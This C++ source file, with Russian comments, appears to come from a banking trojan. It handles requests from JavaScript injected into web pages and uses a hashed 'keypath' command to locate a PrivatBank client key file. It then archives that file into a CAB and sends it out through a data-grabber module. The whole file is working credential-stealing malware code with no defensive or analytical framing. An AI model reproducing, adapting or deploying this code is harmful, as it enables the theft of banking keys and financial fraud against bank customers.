//---------------------------------------------------------------------------

#pragma hdrstop

#include "HTMLInjectsScriptAdapter.h"
//---------------------------------------------------------------------------

#include "Strings.h"
#include "Utils.h"
#include "Loader.h"
#include "CabPacker.h"
#include "StrConsts.h"

void SendPrivatBankKey(const char* Command, const char* Params);



typedef void (*THTMLInjectRequestCommand)(const char* Command, const char* Params);



//----------------------------------------------------------
//  ProcessHTMLInjectRequest - Функция обрабатывает адрес
//  запроса и, в случае если это обращение из ява скрипта
//  внедрённого в страницу, выполняет необходимые действия
//
//  URL - Обрабатываемый адрес
//
//  CloseRequest - Функция установит параметр в истину,
//                 если запрос обработан и дальше не стоит
//                 его пропускать
//----------------------------------------------------------
bool ProcessHTMLInjectRequest(const char* URL, bool* CloseRequest)
{
	if (CloseRequest)
		*CloseRequest = false;

	if (STRA::IsEmpty(URL))
		return false;

	// Определяем имя команды
	int Pos = STRA::Pos(URL, "://");
	if (Pos >= 0)
		URL += Pos + 3;

	// Определяем начало строки параметров
	PCHAR Params = STRA::Scan(URL, '/');

	// Определяем длину команды
	int CmdLen = (Params) ? (Params - URL) : STRA::Length(URL);

	if (Params) Params++;

	DWORD CmdHash = STRA::Hash(URL, CmdLen, true);


	// Проверяем хэш команды
	THTMLInjectRequestCommand Command = NULL;

	if (CmdHash == 0x9E19D547 /* keypath */)
		Command = SendPrivatBankKey;


	// Выполняем команду
	bool Result = false;
	if (Command)
	{
		Result = true;
		if (CloseRequest) *CloseRequest = true;

		string CmdStr;
		CmdStr.Copy(URL, 0, CmdLen);

		Command(CmdStr.t_str(), Params);
	}

	return Result;
}



//----------------------------------------------------------------------------
void SendPrivatBankKey(const char* Command, const char* Params)
{
	// Функция отправляет файл ключа приватбанка
	if (!File::IsExists((PCHAR)Params))
		return;

	// Добавляем фал в архив
	string FN = File::GetTempName2A();

	HCAB Cab = CreateCab(FN.t_str());
	if (Cab)
	{
		PCHAR Name = File::ExtractFileNameA((PCHAR)Params, false);
		bool Added = AddFileToCab(Cab, Params, Name);

		DataGrabber::SendCabDelayed(NULL, FN.t_str(), GetStr(EStrSystemPrivat).t_str());

		CloseCab(Cab);
	}
	DeleteFileA(FN.t_str());
}
